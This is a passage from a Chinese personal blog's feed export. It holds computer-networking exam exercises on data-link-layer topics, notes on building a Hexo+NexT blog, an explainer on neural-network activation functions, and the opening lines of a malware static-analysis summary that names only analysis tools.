<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1673237444155.png"><br><strong>注意</strong>：这个应该是的字节填充法，要换掉转义字符。</p>
<blockquote>
<p>PPP协议使用同步传输技术传送比特串0110111111111100。试问经过零比特填充后变成怎样的比特串？若接收端收到的PPP帧的数据部分是0001110111110111110110，问删除发送端加入的零比特后变成怎样的比特串？</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1673237567724.png"><br><strong>注意</strong>：这个是<strong>零比特填充法</strong></p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1673251861163.png"></p>
<h2 id="差错检测题"><a href="#差错检测题" class="headerlink" title="差错检测题"></a>差错检测题</h2><p>这一类题多为对差错检测方法的考察，其中CRC校验比较重点。</p>
<blockquote>
<p>要发送的数据为1101011011.采用CRC的生成多项式P(X) &#x3D; X^4 + X + 1。试求应添加在数据后面的余数。</p>
<blockquote>
<p>数据在传输过程中最后一个1变成了0，问接收端能否发现？<br>若数据在传输过程中最后两个1都变成了0，问接收端能否发现？<br>采用CRC检验后，数据链路层的传输是否就变成了可靠的传输</p>
</blockquote>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1673237018089.png"><br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1673237070875.png" alt="enter description here"></p>
<p><strong>注意</strong>：二项式除法要会，同时记得先添0在用余数代替。</p>
<blockquote>
<p>要发送的数据为101110。采用CRC的生成多项式是P(X) &#x3D; X^3 + 1。试求应添加在数据后面的余数。</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1673237367332.png"></p>
<h2 id="流量控制题"><a href="#流量控制题" class="headerlink" title="流量控制题"></a>流量控制题</h2><p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1673251986562.png"></p>
<p><strong>注</strong>：如果没有说明确认帧大小则不要去计算时间。</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1673251943408.png"></p>
<p><strong>提醒</strong>：一定要注意单位的换算。</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1673251956969.png"><br><strong>注</strong>：对于回退N帧协议其窗口大小为2^n-1，选择重传协议窗口大小为2^(n-1)。</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1673251970406.png"></p>
<h2 id="媒介访问控制"><a href="#媒介访问控制" class="headerlink" title="媒介访问控制"></a>媒介访问控制</h2><blockquote>
<p>以太网使用的<strong>CSMA&#x2F;CD协议</strong>是以争用方式接入到共享信道的。这与传统的时分复用TDM相比优缺点如何？</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1673250206034.png"><br><strong>我的理解</strong>：网络协议没有好坏之分，只有适用范围之分。</p>
<blockquote>
<p>什么叫比特时间？使用这种时间单位有什么好处？100比特时间是多少微秒？</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1673250457127.png"></p>
<p><strong>注意</strong>：引入了<code>比特时间</code>的概念，后面题目会用到。</p>
<blockquote>
<p>假定1km长的CSMA&#x2F;CD网络的数据率为1Gbit&#x2F;s。设信号在网络上的传播速率为200000km&#x2F;s。求能够使用此协议的最短帧长。</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1673250318917.png"></p>
<p><strong>注意</strong>：计算时需要使用2倍的传播时延。</p>
<blockquote>
<p>假定在使用<strong>CSDA&#x2F;CD协议</strong>的10Mbit&#x2F;s以太网中，某个站在发送数据时检测到碰撞，执行退避算法时选择了<strong>随机数r&#x3D;100</strong>。试问这个站需要等待多长时间后才能再次发送数据？如果是100Mbit&#x2F;s的以太网呢？</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1673250427747.png"><br><strong>注意</strong>：退避时间 &#x3D; 争用时间*r；同时比特时间与实际时间的换算要会，就是加一个单位。</p>
<blockquote>
<p>假定<strong>站点A和B</strong>在同一个<strong>10Mbit&#x2F;s</strong>以太网网段上。这两个站点之间的<strong>传播时延为225比特时间</strong>。现假定A开始发送一帧，并且在A发送结束之前B也发送一帧。如果A发送的是以太网所容许的最短的帧，那么A在检测到和B发生碰撞之前能否把自己的数据发送完毕？换言之，如果A在发送完毕之前并没有检测到碰撞，那么能否肯定A所发送的帧不会和B发送的帧发生碰撞？（提示：在计算时应当考虑到每一个以太网帧在发送信道上时，在MAC帧前面还要增加若干字节的前同步码和帧定界符。）</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1673251056773.png"></p>
<blockquote>
<p>在上题中的站点A和B在<strong>t&#x3D;0时同时发送了数据帧</strong>。当t&#x3D;225比特时间，A和B同时检测到发生了碰撞，并且在t &#x3D; 225 + 48 &#x3D; 273 比特时间完成了干扰信号的传输。A 和 B在CSMA&#x2F;CD算法中<strong>选择不同的r值退避</strong>。假定A和B选择的随机数分别是 rA &#x3D; 0 和 rB&#x3D;1。试问A和B各在什么时间开始重传其数据帧？A重传的数据帧在什么时间到达B？A重传的数据会不会和B重传的数据再次发生碰撞？B会不会在预定的重传时间停止发送数据？</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1673251260098.png"></p>
<p><strong>注意</strong>：关于碰撞问题需要学会画图分析过程。</p>
<h2 id="局域网题目"><a href="#局域网题目" class="headerlink" title="局域网题目"></a>局域网题目</h2><blockquote>
<p><strong>局域网</strong>的主要特点是什么？为什么局域网采用广播通信方式而广域网不采用呢？</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1673241624781.png"></p>
<blockquote>
<p>常用的局域网的<strong>网络拓扑</strong>有哪些种类？现在<strong>最流行的</strong>是哪种结构？为什么早期的以太网选择总线拓扑结构而不使用星型拓扑结构，但现在却改为使用星型拓扑结构？</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1673249303302.png"></p>
<blockquote>
<p>什么叫做传统以太网？以太网有哪两个主要标准？</p>
</blockquote>
<p><strong>答</strong>：传统以太网就是最早流行的<strong>10Mbit&#x2F;s速率</strong>的以太网。</p>
<p>以太网有两个标准，即<code>DIX Ethernet V2</code>标准 和 <code>IEEE 802.3</code> 标准</p>
<blockquote>
<p>数据率为 10Mbit&#x2F;s 的以太网在物理媒体上的<strong>码元传输速率</strong>是多少码元&#x2F;秒？</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1673249373111.png"></p>
<blockquote>
<p>为什么LLC子层的标准已制定出来了但现在却很少使用？</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1673250089281.png"></p>
<blockquote>
<p>有10个站连接到以太网上。试计算以下三种情况下每一个站所能得到的带宽。</p>
<blockquote>
<p>1）10个站都连接到一个10Mbit&#x2F;s以太网集线器。<br>2）10个站都连接到一个100Mbit&#x2F;s以太网集线器。<br>3）10个站都连接到一个10Mbit&#x2F;s以太网交换机。</p>
</blockquote>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1673250842288.png"></p>
<p><strong>注意</strong>：判断问的是每一个站所能得到的带宽 还是 总带宽</p>
<blockquote>
<p>以太网交换机有何特点？用它怎样组成虚拟局域网？</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1673250900007.png"><br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1673250915692.png"></p>
<p><strong>注意</strong>：以太网交换机和集线器的区别要搞懂，特别是在带宽计算上。</p>
<h2 id="物理设备题"><a href="#物理设备题" class="headerlink" title="物理设备题"></a>物理设备题</h2><blockquote>
<p><strong>网络适配器</strong>的作用是什么？网络适配器工作在哪一层？</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1673236179572.png"><br><strong>我的理解</strong>：适配器就是网卡，其作用的发送时进行帧的封装、接收时进行差错检测与帧的交付。</p>
<blockquote>
<p>在图T-3-33中，以太网交换机有6个接口，分别接到5台主机和一个路由器。</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1673251394312.png"></p>
<p><strong>注意</strong>：填补交换表时，只需要看写入的即可。</p>
<blockquote>
<p>图T-3-36表示有五个站分别连接在三个局域网上，并且用网桥B1和B2连接起来。每一个网桥都有两个接口（1和2）。在一开始，两个网桥中的转发表都是空的。以后有以下各站向其他的站按先后顺序发送了数据帧：A发送给E，C发送给B，D发送给C，B发送给A。试把有关数据填写在表T-3-36-a中。</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1673251746973.png"></p>
<blockquote>
<p>假定一个以太网上的通信量中的80%是在本局域网上进行的，而其余的20%的通信量是在本局域网和互联网之间进行的。另一个以太网的情况则反过来。这两个以太网<strong>一个使用以太网集线器</strong>，而<strong>另一个使用以太网交换机</strong>。你认为以太网交换机应当用在哪一个网络上？（本题的目的是要学生能够清楚地知道以太网集线器和以太网交换机的区别。本题并没有一个标准答案。）</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1673251501185.png"></p>
<blockquote>
<p><strong>网桥的工作原理和特点是什么</strong>？<strong>网桥与转发器以及以太网交换机有何异同</strong>？</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1673251640376.png"><br><strong>注意</strong>：区分网桥和集线器、交换机，各自应用层次。</p>
<hr>
<blockquote>
<p><strong>写在最后</strong>：本层的知识点比较多，所以涉及的题目类型也很多，要分门别类去练习，同时与理论知识结合。</p>
</blockquote>
]]></content>
      <categories>
        <category>【-基础知识-】408专题</category>
        <category>计算机网络</category>
      </categories>
      <tags>
        <tag>计算机网络</tag>
      </tags>
  </entry>
  <entry>
    <title>博客搭建-Hexo+nexT</title>
    <url>/2023/10/20/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E4%B9%8B%E8%B7%AF/</url>
    <content><![CDATA[<h1 id="博客搭建之路"><a href="#博客搭建之路" class="headerlink" title="博客搭建之路"></a>博客搭建之路</h1><blockquote>
<p>记录搭建博客时的历程与踩坑！（使用hexo+github+nexT）</p>
</blockquote>
<h2 id="前置内容的下载"><a href="#前置内容的下载" class="headerlink" title="前置内容的下载"></a>前置内容的下载</h2><p><strong>Git</strong>：是目前从开发人员到设计人员的<strong>版本控制技术</strong>。因为我们需要依靠github的仓库作为博客内容的存储与展示，所以需要使用Git进行博客的本地生成与远端推送。</p>
<p><a href="https://zhuanlan.zhihu.com/p/186235435">Git和GitHub入门：完整的小白初学者指南 - 知乎 (zhihu.com)</a></p>
<p><strong>Node.js</strong>： 是一个基于 Chrome V8 引擎的 <strong>Javascript 运行环境</strong>，或者说是一个 <strong>JS 语言解释器</strong>。</p>
<h2 id="hexo基本框架搭建"><a href="#hexo基本框架搭建" class="headerlink" title="hexo基本框架搭建"></a>hexo基本框架搭建</h2><p><strong>参考下面的博客</strong>：</p>
<p><a href="https://zhuanlan.zhihu.com/p/618864711">Hexo+Next主题搭建个人博客+优化全过程（完整详细版） - 知乎 (zhihu.com)</a></p>
<p><strong>踩到的坑</strong>：</p>
<ol>
<li><p>在搭建仓库时，仓库名字要与github的用户名一致。</p>
</li>
<li><p><code>hexo d</code> 推送时，出现<code>remote: Permission to xxx denied to xxx.</code></p>
<p>我这里的原因是本地有凭据，这个凭据的用户又不是博客仓库的，所以导致权限的拒绝。直接在<strong>控制面板的凭据管理</strong>里面删掉即可。</p>
</li>
</ol>
<p>附加<strong>hexo的基本指令</strong>：</p>
<table>
<thead>
<tr>
<th align="center">指令</th>
<th align="center">功能</th>
</tr>
</thead>
<tbody><tr>
<td align="center">hexo new “博客名称”</td>
<td align="center">创建一个新的博客，在 <code>blog/source/_posts/</code> 文件夹</td>
</tr>
<tr>
<td align="center">hexo clean</td>
<td align="center">清除缓存文件 (<code>db.json</code>) 和已生成的静态文件 (<code>public</code>)</td>
</tr>
<tr>
<td align="center">hexo generate（hexo g)</td>
<td align="center">生成静态文件</td>
</tr>
<tr>
<td align="center">hexo server(hexo s)</td>
<td align="center">启动服务器。默认情况下，访问网址为： <code>http://localhost:4000/</code>。</td>
</tr>
<tr>
<td align="center">hexo deploy(hexo d)</td>
<td align="center">部署网站，构建在GitHub的服务器中。</td>
</tr>
</tbody></table>
<h2 id="换主题-Next"><a href="#换主题-Next" class="headerlink" title="换主题-Next"></a>换主题-Next</h2><p>安装与初步优化参考：<a href="https://zhuanlan.zhihu.com/p/618864711">Hexo+Next主题搭建个人博客+优化全过程（完整详细版） - 知乎 (zhihu.com)</a></p>
<p>官方：<a href="http://theme-next.iissnan.com/getting-started.html">开始使用 - NexT 使用文档 (iissnan.com)</a></p>
<p>优化：<a href="https://sspai.com/post/59568#!">hexo next 主题优化 | 这里可能有你遇到所有问题的答案 - 少数派 (sspai.com)</a></p>
<h2 id="typora-阿里云图床"><a href="#typora-阿里云图床" class="headerlink" title="typora+阿里云图床"></a>typora+阿里云图床</h2><p><a href="https://zhuanlan.zhihu.com/p/138878534">最强markdown编辑器typora图床教程- 阿里云版 - 知乎 (zhihu.com)</a></p>
<p><strong>建议</strong>：下载PicGo-Core时可以挂个梯子</p>
<h2 id="配置域名"><a href="#配置域名" class="headerlink" title="配置域名"></a>配置域名</h2><p><strong>配置域名</strong>：<a href="https://zhuanlan.zhihu.com/p/338299590">hexo绑定域名 - 知乎 (zhihu.com)</a></p>
<h2 id="hexo写文上传"><a href="#hexo写文上传" class="headerlink" title="hexo写文上传"></a>hexo写文上传</h2><p><strong>基本流程</strong>：<a href="https://hexo.io/zh-cn/docs/writing">写作 | Hexo</a></p>
<p><strong>标签、分类</strong>：<a href="https://blog.csdn.net/weixin_48927364/article/details/123295436">【Hexo】nexT主题使用攻略基础——添加分类、标签及关于_hexo 分类-CSDN博客</a></p>
<p><strong>设置加密</strong>：[Hexo博客设置文章加密_hexo-blog-encrypt-CSDN博客](<a href="https://blog.csdn.net/WwLK123/article/details/124436871#:~:text=Hexo%E5%8D%9A%E5%AE%A2%E8%AE%BE%E7%BD%AE%E6%96%87%E7%AB%A0%E5%8A%A0%E5%AF%86">https://blog.csdn.net/WwLK123/article/details/124436871#:~:text=Hexo博客设置文章加密</a> 1 1、安装插件 首先运行以下命令，安装设置密码所需要的插件： npm install hexo-blog-encrypt 2,密码 message%3A 输入密码界面提示说明 4 4、效果展示 接着运行你的博客，访问相应的加密文章之后，会提示 输入密码才能查看文章 ：)</p>
<p><strong>配置主页</strong>：<a href="https://zhuanlan.zhihu.com/p/138500516">Hexo Next主题博客主页自定义设置 - 知乎 (zhihu.com)</a></p>
<p><strong>报错</strong>：YAMLException——记得加空格</p>
<p><img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//imageimage-20231103162849432.png" alt="image-20231103162849432"></p>
]]></content>
      <categories>
        <category>【+生活分享+】技能技巧</category>
        <category>工作技巧</category>
      </categories>
      <tags>
        <tag>博客</tag>
        <tag>two</tag>
      </tags>
  </entry>
  <entry>
    <title>基础知识--激活函数相关</title>
    <url>/2023/03/25/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%862--%E6%BF%80%E6%B4%BB%E5%87%BD%E6%95%B0%E7%9B%B8%E5%85%B3/</url>
    <content><![CDATA[<blockquote>
<p><strong>写在最前面</strong>：</p>
</blockquote>
<p>本篇文章用于记录神经网络中<code>激活函数</code>相关的知识，主要包括：激活函数的<code>含义</code>、<code>用处</code>、<code>分类</code>、<code>选择</code>等。</p>
<p><strong>参考内容</strong>如下：</p>
<p><a href="https://zhuanlan.zhihu.com/p/427541517">详解激活函数（Sigmoid&#x2F;Tanh&#x2F;ReLU&#x2F;Leaky ReLu等）</a></p>
<p><a href="https://mp.weixin.qq.com/s?__biz=MzU5MTgzNzE0MA==&mid=2247492551&idx=2&sn=47e41d48424fedfde2eb08c583b54c53&chksm=fe2a417cc95dc86a78f09719be682c1ea6ea3889e8da660826aedad18b9267165fcbf0d7079f&mpshare=1&scene=23&srcid=0903zPZdr8efEPL6x2WvnAdq&sharer_sharetime=1662164012375&sharer_shareid=0c850b83a40c9f40b901c93134e9d9bf#rd">美！最常用的10个激活函数！</a></p>
<p><a href="https://www.sohu.com/a/443926198_453160">人工神经网络的驱动者：激活函数是什么？</a> </p>
<h1 id="什么是激活函数"><a href="#什么是激活函数" class="headerlink" title="什么是激活函数"></a>什么是激活函数</h1><p><code>激活函数</code>（Activation-Function）是一种添加到<strong>人工神经网络</strong>中的函数，旨在帮助网络学习数据中的<strong>复杂模式</strong>。类似于人类大脑中基于神经元的模型，激活函数<strong>最终决定</strong>了要发射给下一个神经元的内容。</p>
<p>在人工神经网络中，一个节点的激活函数定义了该节点在给定的<strong>输入或输入集合</strong>下的<strong>输出</strong>。也就是说，<code>激活函数</code>决定了神经网络每一层节点的输出值，不同的激活函数可以得到不同的<strong>输出值曲线</strong>，以适应<strong>不同的需求</strong>。</p>
<h1 id="神经网络的传播流程"><a href="#神经网络的传播流程" class="headerlink" title="神经网络的传播流程"></a>神经网络的传播流程</h1><blockquote>
<p>在介绍具体的激活函数之前，我们需要先了解一下神经网络的传播流程，以确定激活函数在这个传播过程中的实施位置，从全局的角度进行理解。</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1662164395086.png"></p>
<p>上图给出了神经网络的前向传播流程，或者说是神经网络其中一个节点的传播流程。神经网络是由很多节点构成的，每一个节点的实现都是相同的，所以我们这里只需要了解单独一个节点的传播流程即可。</p>
<p>可以将此节点的传播流程分为两个部分：</p>
<ul>
<li>值的计算：输入值与权值的乘积和+偏置项</li>
<li>激活函数：将上值作为自变量输入到激活函数而后将映射值作为输出即可。</li>
</ul>
<p>每一个节点的输出都是下一层节点的一个输入。</p>
<h1 id="激活函数的原理"><a href="#激活函数的原理" class="headerlink" title="激活函数的原理"></a>激活函数的原理</h1><blockquote>
<p>前面介绍激活函数时提到：<strong>激活函数可以帮助网络学习数据的复杂模式</strong>，但是到底是<strong>如果帮助的呢</strong>？</p>
</blockquote>
<p><strong>答</strong>：<strong>激活函数</strong>是向神经网络中引入<code>非线性因素</code>，通过激活函数神经网络就可以<strong>拟合各种曲线</strong>。</p>
<blockquote>
<p>为什么需要加入<strong>非线性因素</strong>？</p>
</blockquote>
<p>因为我们使用到的绝大多数数据集都是非线性分布的，而神经网络中值的计算：v&#x3D;wx+b显然是线性的。在神经网络中，如果网络的每层都是<strong>线性映射</strong>，那么这些层组合起来依然是<strong>线性</strong>的。因此，多层的线性映射复合后实际上只是起到了<strong>一层的效果</strong>，这样就算<strong>增加神经网络层数</strong>也无法提高模型的<strong>表达能力</strong>。<br>为了使网络的<strong>映射不是线性</strong>的，所有层的<strong>输出</strong>都要传递到<strong>非线性函数</strong>中，如 <code>ReLU 函数</code>和 <code>Tanh函数</code>等，这样作用之后就成为了<strong>非线性的</strong>。这些非线性函数就是<code>激活函数</code>。</p>
<blockquote>
<p>通过一张图简要看一下<strong>激活函数的作用</strong></p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1662258710204.png"></p>
<p>如图所示，<strong>前两层</strong>为加入<strong>激活函数</strong>后的模型效果，<strong>第三层</strong>为<strong>线性模型</strong>的效果。</p>
<h1 id="常用的几个激活函数"><a href="#常用的几个激活函数" class="headerlink" title="常用的几个激活函数"></a>常用的几个激活函数</h1><h3 id="Sigmoid函数"><a href="#Sigmoid函数" class="headerlink" title="Sigmoid函数"></a>Sigmoid函数</h3><blockquote>
<p>函数图像与映射关系</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1662258936528.png"></p>
<p>其<strong>函数表达式</strong>如下：</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1662258960252.png"></p>
<blockquote>
<p>函数介绍</p>
</blockquote>
<p><code>Sigmoid 函数</code>的输出范围是<strong>0到1</strong>。由于输出值限定在0到1，因此它对每个神经元的<strong>输出进行了归一化</strong></p>
<blockquote>
<p>适用场景</p>
</blockquote>
<p>用于将<strong>预测概率</strong>作为<strong>输出</strong>的模型。由于概率的取值范围是 0 到 1，因此 Sigmoid 函数非常合适。常用于<strong>二分类问题</strong>中。将输出压缩到[0，1]范围内。大部分时候都与<strong>二元交叉熵损失</strong>一起使用。</p>
<blockquote>
<p>飞桨实现</p>
</blockquote>
<p><a href="https://www.paddlepaddle.org.cn/documentation/docs/zh/api/paddle/nn/Sigmoid_cn.html">函数界面</a></p>
<h3 id="SoftMax函数"><a href="#SoftMax函数" class="headerlink" title="SoftMax函数"></a>SoftMax函数</h3><blockquote>
<p>函数图像与映射关系</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1662259301064.png"></p>
<p>其<strong>函数表达式</strong>如下：</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1662259313282.png"></p>
<blockquote>
<p><strong>函数介绍</strong></p>
</blockquote>
<p>对于<strong>长度为 K</strong> 的任意实向量，<code>Softmax</code>可以将其压缩为长度为K，值在<code>（0，1）</code>范围内，并且向量中元素的<strong>总和为 1</strong> 的实向量。</p>
<blockquote>
<p><strong>适用场景</strong></p>
</blockquote>
<p>在<strong>多分类</strong>中经常使用，使网络输出的是有效的<strong>概率分布</strong>。这意味着所有值都在 [0，1] 范围内，且总和为 1。可与<strong>多元交叉熵损失</strong>一起使用。</p>
<blockquote>
<p>飞桨实现</p>
</blockquote>
<p><a href="https://www.paddlepaddle.org.cn/documentation/docs/zh/api/paddle/nn/Softmax_cn.html#paddle.nn.Softmax">函数介绍界面</a></p>
<h3 id="Tanh-双曲正切激活函数"><a href="#Tanh-双曲正切激活函数" class="headerlink" title="Tanh &#x2F; 双曲正切激活函数"></a>Tanh &#x2F; 双曲正切激活函数</h3><blockquote>
<p>函数图像与映射关系</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1662259022471.png"></p>
<p>其<strong>函数表达式</strong>如下:</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1662259043344.png"></p>
<blockquote>
<p>函数介绍</p>
</blockquote>
<p>tanh 是一个双曲正切函数。<code>tanh</code> 函数和 <code>sigmoid</code> 函数的曲线相对相似。但是它比 sigmoid 函数<strong>更有一些优势。</strong></p>
<blockquote>
<p>适用场景</p>
</blockquote>
<p>在一般的<strong>二元分类问题</strong>中，<code>tanh函数</code>用于<strong>隐藏层</strong>，而<code>sigmoid函数</code>用于<strong>输出层</strong>，但这并不是固定的，需要根据特定问题进行调整。</p>
<blockquote>
<p>飞桨实现</p>
</blockquote>
<p><a href="https://www.paddlepaddle.org.cn/documentation/docs/zh/api/paddle/nn/Tanh_cn.html">函数界面</a></p>
<h3 id="ReLU函数"><a href="#ReLU函数" class="headerlink" title="ReLU函数"></a>ReLU函数</h3><blockquote>
<p>函数图像与映射关系</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1662259074806.png"></p>
<p>其<strong>函数表达式</strong>如下:</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1662259090809.png"></p>
<blockquote>
<p>函数介绍</p>
</blockquote>
<p><code>ReLU 函数</code>是深度学习中较为流行的一种激活函数，相比于 <code>sigmoid 函数</code>和 <code>tanh 函数</code>，它具有<strong>如下优点</strong>：</p>
<ul>
<li>当<strong>输入为正</strong>时，不存在<strong>梯度饱和</strong>问题。</li>
<li><strong>计算速度</strong>快得多。ReLU 函数中只存在线性关系，因此它的计算速度比 sigmoid 和 tanh 更快</li>
</ul>
<p>当然<strong>也有缺点</strong>：</p>
<ul>
<li><code>Dead ReLU</code> 问题。当输入为负时，<strong>ReLU完全失效</strong>，在正向传播过程中，这不是问题。有些区域很敏感，有些则不敏感。但是在反向传播过程中，如果输入负数，则梯度将完全为零，sigmoid 函数和 tanh 函数也具有相同的问题；</li>
<li>我们发现 ReLU 函数的输出<strong>为0或正数</strong>，这意味着ReLU函数<strong>不是以0为中心</strong>的函数。</li>
</ul>
<blockquote>
<p>飞桨实现</p>
</blockquote>
<p><a href="https://www.paddlepaddle.org.cn/documentation/docs/zh/api/paddle/nn/ReLU_cn.html">函数界面</a></p>
<h3 id="Leaky-ReLU函数"><a href="#Leaky-ReLU函数" class="headerlink" title="Leaky ReLU函数"></a>Leaky ReLU函数</h3><blockquote>
<p>函数图像与映射关系</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1662259144647.png"></p>
<p>其<strong>函数表达式</strong>如下:</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1662259160032.png"></p>
<blockquote>
<p>函数介绍</p>
</blockquote>
<p>它是一种专门设计用于解决 <code>Dead ReLU</code> 问题的激活函数,leak 有助于<strong>扩大</strong> ReLU 函数的<strong>范围</strong>，通常 a 的值为 <code>0.01</code> 左右；</p>
<blockquote>
<p>飞桨实现</p>
</blockquote>
<p><a href="https://www.paddlepaddle.org.cn/documentation/docs/zh/api/paddle/nn/LeakyReLU_cn.html#leakyrelu">函数界面</a></p>
<h3 id="ELU函数"><a href="#ELU函数" class="headerlink" title="ELU函数"></a>ELU函数</h3><blockquote>
<p>函数图像与映射关系</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1662259194937.png"></p>
<p>其<strong>函数表达式</strong>如下:</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1662259205886.png"></p>
<blockquote>
<p>函数介绍</p>
</blockquote>
<p><code>ELU</code>的提出也解决了<strong>ReLU的问题</strong>。与ReLU相比，ELU<strong>有负值</strong>，这会使激活的平均值接近零。均值激活接近于零可以使<strong>学习更快</strong>，因为它们使梯度<strong>更接近自然梯度</strong>。</p>
<blockquote>
<p>飞桨实现</p>
</blockquote>
<p><a href="https://www.paddlepaddle.org.cn/documentation/docs/zh/api/paddle/nn/ELU_cn.html#elu">函数界面</a></p>
]]></content>
      <categories>
        <category>【-基础知识-】人工智能</category>
        <category>基础知识</category>
      </categories>
      <tags>
        <tag>机器学习</tag>
      </tags>
  </entry>
  <entry>
    <title>恶意代码整体分析流程总结</title>
    <url>/2023/11/06/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90-%E6%95%B4%E4%BD%93%E5%88%86%E6%9E%90%E6%B5%81%E7%A8%8B%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h1 id="基础静态分析"><a href="#基础静态分析" class="headerlink" title="基础静态分析"></a>基础静态分析</h1><blockquote>
<p>静态分析一般是看<strong>导入函数与字符串</strong>，可以通过<code>IDA</code>查看；<strong>具体节的内容</strong>可以通过<code>PEview</code>查看；<strong>资源节</strong>可以通过<code>Resource-Hackintg</code>查看；<strong>壳</strong>可以通过<code>PEiD</code>查看。</p>
</blockquote>
